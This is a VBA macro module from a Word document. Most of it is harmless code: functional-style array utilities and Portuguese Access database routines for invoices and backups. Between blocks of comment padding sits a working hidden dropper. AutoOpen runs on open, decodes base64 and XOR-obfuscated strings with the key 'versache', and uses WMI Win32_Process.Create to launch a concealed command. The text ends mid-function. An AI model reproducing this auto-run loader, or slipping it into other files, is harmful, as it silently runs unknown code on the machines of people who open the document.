Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If
 


 
 Dim Dequl As Variant


Public Function evalA(argAry As Variant) As Variant
    
    ary = argAry
    
    Dim ret As Variant
    lb = LBound(ary)
    
    Select Case lenAry(ary)
            
        Case 1: ret = Application.Run(ary(lb))
        Case 2: ret = Application.Run(ary(lb), ary(lb + 1))
        Case 3: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2))
        Case 4: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3))
        Case 5: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4))
        Case 6: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5))
        Case 7: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6))
        Case 8: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7))
        Case 9: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8))
        Case 10: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9))
        Case 11: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10))
        Case 12: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11))
        Case 13: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12))
        Case 14: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13))
        Case 15: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14))
        Case 16: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15))
        Case 17: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16))
        Case 18: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17))
        Case 19: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18))
        Case 20: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19))
        Case 21: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20))
        Case 22: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21))
        Case 23: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22))
        Case 24: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23))
        Case 25: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23), ary(lb + 24))
        Case 26: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23), ary(lb + 24), ary(lb + 25))
        Case 27: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23), ary(lb + 24), ary(lb + 25), ary(lb + 26))
        Case 28: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23), ary(lb + 24), ary(lb + 25), ary(lb + 26), ary(lb + 27))
        Case 29: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23), ary(lb + 24), ary(lb + 25), ary(lb + 26), ary(lb + 27), ary(lb + 28))
        Case 30: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23), ary(lb + 24), ary(lb + 25), ary(lb + 26), ary(lb + 27), ary(lb + 28), ary(lb + 29))
        Case 31: ret = Application.Run(ary(lb), ary(lb + 1), ary(lb + 2), ary(lb + 3), ary(lb + 4), ary(lb + 5), ary(lb + 6), ary(lb + 7), ary(lb + 8), ary(lb + 9), ary(lb + 10), ary(lb + 11), ary(lb + 12), ary(lb + 13), ary(lb + 14), ary(lb + 15), ary(lb + 16), ary(lb + 17), ary(lb + 18), ary(lb + 19), ary(lb + 20), ary(lb + 21), ary(lb + 22), ary(lb + 23), ary(lb + 24), ary(lb + 25), ary(lb + 26), ary(lb + 27), ary(lb + 28), ary(lb + 29), ary(lb + 30))
            
        Case Else:
    End Select
    
    evalA = ret
    
End Function

Public Function mapA(fnc As String, seq As Variant, ParamArray argAry() As Variant) As Variant
    
    ary = argAry
    
    
    fnAry = conArys(fnc, Null, ary)
    
    Num = lenAry(seq)
    
    ReDim ret(1 To Num)
    
    
    Dim I As Long
    
    For I = 1 To Num
        
        Call setAryAt(fnAry, 2, getAryAt(seq, I))
        
        ret(I) = evalA(fnAry)
        
    Next I
    
    mapA = ret
    
End Function

Public Function filterA(fnc As String, seq As Variant, ParamArray argAry() As Variant) As Variant
    
    ary = argAry
    
    Num = lenAry(seq)
    
    fnAry = conArys(fnc, Null, ary)
    
    idx = 0
    
    ReDim ret(1 To Num)
    
    
    For Each elm In seq
        
        
        Call setAryAt(fnAry, 2, elm)
        
        If evalA(fnAry) Then
            idx = idx + 1
            ret(idx) = elm
        End If
        
    Next elm
    
    ReDim Preserve ret(1 To idx)
    
    filterA = ret
    
End Function

Public Function foldA(fnc As String, seq As Variant, init As Variant, ParamArray argAry() As Variant) As Variant
    
    
    ary = argAry
    fnObj = Array(Array(1, 2), prmAry(fnc, Null, Null, ary))
    
    
    ret = foldF(fnObj, seq, init)
    
    
    
    foldA = ret
    
End Function

Public Function foldF(fnObj, seq As Variant, init As Variant) As Variant
    
    
    ret = init
    
    For Each elm In seq
        
        ret = applyF(Array(ret, elm), fnObj, True)
        
        
    Next elm
    
    foldF = ret
    
End Function
Public Function reduceF(fnObj, seq As Variant) As Variant
    
    init = getAryAt(seq, 1)
    seq1 = dropAry(seq, 1)
    
    
    ret = foldF(fnObj, seq1, init)
    
    reduceF = ret
    
End Function

Public Function reduceA(fnc As String, seq As Variant, ParamArray argAry() As Variant) As Variant
    
    ary = argAry
    
    fnObj = Array(Array(1, 2), prmAry(fnc, Null, Null, ary))
    
    ret = reduceF(fnObj, seq)
    
    reduceA = ret
    
End Function

Function applyF(vl, fnObj, Optional argAsAry = False)
    
    Dim ret
    
    fnAry = getAryAt(fnObj, 2)
    arity = getAryAt(fnObj, 1)
    
    If Not argAsAry Then
        
        Call setAryAt(fnAry, getAryAt(arity, 1), vl, 0)
        
    Else
        
        n = lenAry(arity)
        
        For I = 1 To n
            
            Call setAryAt(fnAry, getAryAt(arity, I), getAryAt(vl, I), 0)
            
        Next I
        
    End If
    
    
    ret = evalA(fnAry)
    applyF = ret
    
End Function

Function applyFs(vl, fnObjs, Optional argAsAry = False)
    
    Dim ret
    ret = vl
    For Each fnObj In fnObjs
        ret = applyF(ret, fnObj, argAsAry)
    Next fnObj
    
    applyFs = ret
    
End Function

Function getArity(ary)
    
    Dim ret
    ret = 0
    For Each elm In ary
        If IsNumeric(elm) Then
            ret = ret + 1
        Else
            Exit For
            
        End If
    Next elm
    getArity = ret
    
    
End Function

Function mkF(ParamArray argArys())
    
    ary = argArys
    
    
    n = getArity(ary)
    
    arity = takeAry(ary, n)
    fnAry = dropAry(ary, n)
    
    mkF = Array(arity, fnAry)
    
End Function

Function zipApplyF(fnObj, ParamArray argAry())
    
    arys = argAry
    
    x = zipAry(arys)
    
    ret = mapA("applyF", x, fnObj, True)
    
    zipApplyF = ret
    
End Function

Sub setAryByF(ary, fnObj)
    sp = getAryShape(ary)
    lsp = getAryShape(ary, "L")
    
    n = getAryNum(ary)
    
    For I = 0 To n - 1
        idx = mkIndex(I, sp, lsp)
        vl = applyF(I, fnObj)
        Call setElm(vl, ary, idx)
        
    Next I
    
End Sub

Sub printAry(ary)
    
    Debug.Print toString(ary)
    
End Sub

Function toString(elm) As String
    
    Dim ret
    
    ret = ""
    
    If IsArray(elm) Then
        
        d = dimAry(elm)
        
        ret = ret & "["
        sp = getAryShape(elm)
        lsp = getAryShape(elm, "L")
        aryNum = getAryNum(elm)
        
        If aryNum = 0 Then
            
            ret = ret & "]"
        Else
            
            For I = 0 To aryNum - 1
                
                idx0 = mkIndex(I, sp, lsp)
                idx = mkIndex(I, sp)
                
                vl = getElm(elm, idx0)
                dlm = getDlm(sp, idx)
                
                ret = ret & toString(vl) & dlm
                
            Next I
            
        End If
        
    Else
        
        If IsObject(elm) Then
            
            ret = ret & "<" & TypeName(elm) & ">"
            
            
        ElseIf TypeName(elm) = "String" Then
            
            ret = ret & "'" & CStr(elm) & "'"
            
        ElseIf IsNull(elm) Then
            
            ret = ret & "Null"
            
        Else
            
            ret = ret & CStr(elm)
            
        End If
        
    End If
    
    toString = ret
    
End Function

Function getDlm(shape, idx)
    
    Dim ret
    n = lenAry(shape)
    
    m = 0
    For I = n To 1 Step -1
        If getAryAt(shape, I) - 1 > getAryAt(idx, I) Then
            m = I
            Exit For
        End If
    Next I
    
    
    Select Case m
        Case 0
            ret = "]"
        Case n
            ret = ","
        Case n - 1
            ret = ";" & vbCrLf
        Case Else
            
            ret = String(n - m, ";") & vbCrLf & vbCrLf
    End Select
    getDlm = ret
    
    
End Function

Function printTime(fnc As String, ParamArray argAry() As Variant)
    
    Dim etime As Double
    Dim stime As Double
    Dim secs  As Double
    
    ary = argAry
    
    fnAry = conArys(fnc, ary)
    
    stime = Timer
    printTime = evalA(fnAry)
    etime = Timer
    
    secs = etime - stime
    
    Debug.Print fnc & " - " & secToHMS(secs)
    
End Function

Function secToHMS(vl As Double)
    'Dim x2 As Double
    
    x0 = vl
    x1 = Int(x0)
    x2 = x0 - x1
    x3 = mkIndex(x1, Array(24, 60, 60))
    x4 = getAryAt(x3, 3) + x2
    ret = Format(getAryAt(x3, 1), "00") & ":" & Format(getAryAt(x3, 2), "00") & ":" & Format(x4, "00.000")
    
    secToHMS = ret
    
End Function
Function calc(num1, num2, symbol As String)
    
    Dim ret
    
    Select Case symbol
            
        Case "+": ret = num1 + num2
        Case "-": ret = num1 - num2
        Case "*": ret = num1 * num2
        Case "/": ret = num1 / num2
        Case "\": ret = num1 \ num2
        Case "%": ret = num1 Mod num2
        Case "^": ret = num1 ^ num2
            
        Case Else
            
    End Select
    
    calc = ret
    
End Function

Function clcToAry(clc As Collection)
    
    cnt = clc.Count
    
    ReDim ret(1 To cnt)
    
    For I = 1 To cnt
        ret(I) = clc.Item(I)
    Next I
    
    clcToAry = ret
    
End Function

Function mcLike(word As String, wildcard As String, Optional include As Boolean = True) As Boolean
    Dim bol As Boolean
    bol = word Like wildcard
    mcLike = IIf(include, bol, Not bol)
End Function

Function mcJoin(ary, Optional dlm As String = "", Optional pre As String = "", Optional suf As String = "") As String
    
    Dim ret As String
    ret = pre & Join(ary, dlm) & suf
    
    mcJoin = ret
    
End Function

Function addStr(body As String, Optional prefix As String = "", Optional suffix As String = "")
    
    addStr = prefix & body & suffix
    
End Function

Function trimAry(ary As Variant) As Variant
    
    trimAry = filterA("mcLike", ary, "", False)
    
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Sub Frukts()

Vutri
End Sub

    

Sub Vutri()

    Dim Minimum As Variant
    Minimum = NobosMeik(VibinJoin("IQcXHjIAGgwGERsdBk07MhQAHz8OAAkRGRc="), "versache")
    Set Futril = CreateObject(Minimum)


    Set Dequl = Futril.ConnectServer()
    Dequl.Security_.ImpersonationLevel = 34 - 31
    Call Vogi_u
    
End Sub



Function Vogi_u()
    Dim Grut_my_Friend As Variant
    Set Grut_my_Friend = Dequl _
    .Get _
    ("Win32_Process")
    On Error _
    Resume Next
    Call Grut_my_Friend _
    .Create _
    (NobosMeik _
    (VibinJoin _
    ("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECSU5MHAAFERsdBk4KAlgWGwcETBwqBEsWEhVPABECFUhcThcNFgIMHBRMAQ9LBQwGFk4lAQIjCVwXABdEDQIRAklOTBwABREbHQZOCgJYFhsHBEwKKwwxXBcAF0hIMgABBwgNCREfChxTPUFMABgTSCckLjg5AAwWHE8ABwgqR14vQ0cNCwBfJjYsMzQWEAAAEj1BRDlUQRcdF1k8IDs1LhEvGTxLFQofL0NYSDYTEV8/DgAJER8KHFNMMwkRHkUuUUUGBhNMMTc+MT9KXlYGFwEVFhwMGkVfFwQABwETRQEVBBEJRRIASVNBMBwEBBFfIxMMCwAFFlIFCAcHSxUKH1NMIhoCAwgXHRUvARYCRRYW"), "versache"), _
    Null, Null, Cex)

  
End Function




Private Function NobosMeik(text As String, key As String) As String
  Dim VifoLer() As Byte
  Dim Grido() As Byte
  
  Dim VifJon As Long
  Dim GitClone As Long
    
  
  VifoLer = StrConv(text, vbFromUnicode)
  VifJon = UBound(VifoLer, 1)
  Grido = StrConv(key, vbFromUnicode)
  GitClone = UBound(Grido, 1)
  Dim VibikO As Long
  Dim Vbokil As Long
  
  For VibikO = (23 * 3 - 69) To VifJon
    VifoLer(VibikO) = _
    VifoLer(VibikO) _
    Xor _
    Grido(Vbokil)
    If Vbokil < GitClone Then
      Vbokil = _
      Vbokil + _
      (43 - 42)
    Else
      
      Vbokil = 79 - 2 * 39 - 1
    End If
  Next VibikO
  NobosMeik = StrConv(VifoLer, 64)
End Function

Public Function VibinJoin(Vecad As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim kerfas           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin" + ".ba" + "se" & 64
        .text = Vecad
        baValue = .NodeTypedValue
        sValue = String$((2 * 4 - 4) * UBound(baValue), (45 * 2 - 90))
        kerfas = MultiByteToWideChar(CP_UTF8, 12 * 2 - 24, baValue((32 + 42 - 74)), UBound(baValue) + (49 - 48), StrPtr(sValue), Len(sValue))
        VibinJoin = Left$(sValue, kerfas)
    End With
End Function

Public Sub AutoOpen()


Frukts
    

End Sub
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public Function ConcatRelated(strField As String, _
    strTable As String, _
    Optional strWhere As String, _
    Optional strOrderBy As String, _
    Optional strSeparator = ", ") As Variant
On Error GoTo Err_Handler
    'Purpose:   Generate a concatenated string of related records.
    'Return:    String variant, or Null if no matches.
    'Arguments: strField = name of field to get results from and concatenate.
    '           strTable = name of a table or query.
    '           strWhere = WHERE clause to choose the right values.
    '           strOrderBy = ORDER BY clause, for sorting the values.
    '           strSeparator = characters to use between the concatenated values.
    'Notes:     1. Use square brackets around field/table names with spaces or odd characters.
    '           2. strField can be a Multi-valued field (A2007 and later), but strOrderBy cannot.
    '           3. Nulls are omitted, zero-length strings (ZLSs) are returned as ZLSs.
    '           4. Returning more than 255 characters to a recordset triggers this Access bug:
    '               http://allenbrowne.com/bug-16.html
    Dim rs As dao.Recordset         'Related records
    Dim rsMV As dao.Recordset       'Multi-valued field recordset
    Dim strSql As String            'SQL statement
    Dim strOut As String            'Output string to concatenate to.
    Dim lngLen As Long              'Length of string.
    Dim bIsMultiValue As Boolean    'Flag if strField is a multi-valued field.
    
    'Initialize to Null
    ConcatRelated = Null
    
    'Build SQL string, and get the records.
    strSql = "SELECT " & strField & " FROM " & strTable
    If strWhere <> vbNullString Then
        strSql = strSql & " WHERE " & strWhere
    End If
    If strOrderBy <> vbNullString Then
        strSql = strSql & " ORDER BY " & strOrderBy
    End If
    
    Set rs = DBEngine(0)(0).OpenRecordset(strSql, dbOpenDynaset)
    'Determine if the requested field is multi-valued (Type is above 100.)
    bIsMultiValue = (rs(0).Type > 100)
    'Loop through the matching records
    Do While Not rs.EOF
        If bIsMultiValue Then
            'For multi-valued field, loop through the values
            Set rsMV = rs(0).Value
            Do While Not rsMV.EOF
                If Not IsNull(rsMV(0)) Then
                    strOut = strOut & rsMV(0) & strSeparator
                End If
                rsMV.MoveNext
            Loop
            Set rsMV = Nothing
        ElseIf Not IsNull(rs(0)) Then
            strOut = strOut & rs(0) & strSeparator
        End If
        rs.MoveNext
    Loop
    rs.Close
    'Return the string without the trailing separator.
    lngLen = Len(strOut) - Len(strSeparator)
    If lngLen > 0 Then
        ConcatRelated = Left(strOut, lngLen)
    End If

Exit_Handler:
    'Clean up
    Set rsMV = Nothing
    Set rs = Nothing
    Exit Function

Err_Handler:
    MsgBox "Error " & Err.Number & ": " & Err.Description, vbExclamation, "ConcatRelated()"
    Resume Exit_Handler
End Function

Public Function CadastrarDuplicata(codNotaFiscal As Long)
Dim rNF As dao.Recordset
Dim rDPL As dao.Recordset

Set rNF = CurrentDb.OpenRecordset("Select * from NotasFiscais where codNotaFiscal = " & codNotaFiscal)
Set rDPL = CurrentDb.OpenRecordset("Select * from Duplicatas ")

If Not rNF.EOF Then
    
    rDPL.AddNew
    rDPL.Fields("codDuplicata") = NovoCodigo("Duplicatas", "codDuplicata")
    rDPL.Fields("codCliente") = rNF.Fields("codCliente")
    rDPL.Fields("N_Duplicata") = rNF.Fields("FaturaNumero")
    rDPL.Fields("NF_Fatura") = rNF.Fields("FaturaNumero")
    rDPL.Fields("ValorDaDuplicata") = rNF.Fields("FaturaValor")
    rDPL.Fields("DataDeEmissao") = rNF.Fields("DataDeEmissao")
    rDPL.Update
    
End If

rNF.Close
rDPL.Close

Set rNF = Nothing
Set rDPL = Nothing

End Function




Public Function NovoCodigo(Tabela, Campo)

Dim rstTabela As dao.Recordset
Set rstTabela = CurrentDb.OpenRecordset("SELECT Max([" & Campo & "])+1 AS CodigoNovo FROM " & Tabela & ";")
If Not rstTabela.EOF Then
   NovoCodigo = rstTabela.Fields("CodigoNovo")
   If IsNull(NovoCodigo) Then
      NovoCodigo = 1
   End If
Else
   NovoCodigo = 1
End If
rstTabela.Close

End Function

Public Function Pesquisar(Tabela As String)
                                   
On Error GoTo Err_Pesquisar
  
    Dim stDocName As String
    Dim stLinkCriteria As String

    stDocName = "Pesquisar"
    strTabela = Tabela
       
    DoCmd.OpenForm stDocName, , , stLinkCriteria
    
Exit_Pesquisar:
    Exit Function

Err_Pesquisar:
    MsgBox Err.Description
    Resume Exit_Pesquisar
    
End Function


Public Function bkp()
Dim rstBKP As dao.Recordset

Set rstBKP = CurrentDb.OpenRecordset("Select * from bkp order by codCaminho")

While Not rstBKP.EOF
    Backup rstBKP.Fields("Caminho")
    rstBKP.MoveNext
Wend

rstBKP.Close

End Function


Public Function Backup(sDestino As String)
'===================================================================
'   Funcoes agregadas a esta funcao:
'   > CompactarRepararDatabase
'   > CriarPasta
'   > getPath
'   > getFileName
'   > getFileExt
''===================================================================

Dim oFSO As New FileSystemObject
Dim oPasta As New FileSystemObject
Dim oSHL
Dim tmp, p1, p2, p3, p4, p5
Dim Origem As String
Dim sOrigem As String
Dim sArquivo As String
Dim sExtencao As String

sOrigem = Application.CurrentProject.Path
sArquivo = getFileName(Application.CurrentProject.Path & "\db" & Application.CurrentProject.Name)
sExtencao = getFileExt(Application.CurrentProject.Path & "\db" & Application.CurrentProject.Name)

On Error Resume Next
Err.Clear

Origem = sOrigem & "\" & sArquivo & sExtencao

'Comeca o bkp se o arquivo existir na origem
If Dir(Origem) <> "" Then
   
    Application.Screen.MousePointer = 11
   
    p1 = Right("00" & Year(Now()), 2)
    p2 = Right("00" & Month(Now()), 2)
    p3 = Right("00" & Day(Now()), 2)
    p4 = Right("00" & Hour(Now()), 2)
    p5 = Right("00" & Minute(Now()), 2)
     
    tmp = ("_" & p1 & p2 & p3 & "_" & p4 & p5)
    
    CompactarRepararDatabase sOrigem & "\" & sArquivo & sExtencao
    
    sOrigem = sOrigem & "\"
    
    oFSO.CopyFile sOrigem & sArquivo & sExtencao, sDestino & sArquivo & tmp & sExtencao, True
    
    Application.Screen.MousePointer = 0
    
Else
    
    MsgBox "ATENCAO: Execute esta operacao apartir do computador que contem os dados do sistema", vbInformation + vbOKOnly, "Backup"
    
End If

End Function

Public Function CompactarRepararDatabase(DatabasePath As String, Optional Password As String, Optional TempFile As String = "c:\tmp.mdb")
'===================================================================
' Se a versao DAO for anterior a 3.6 , entao devemos usar o metodo RepairDatabase
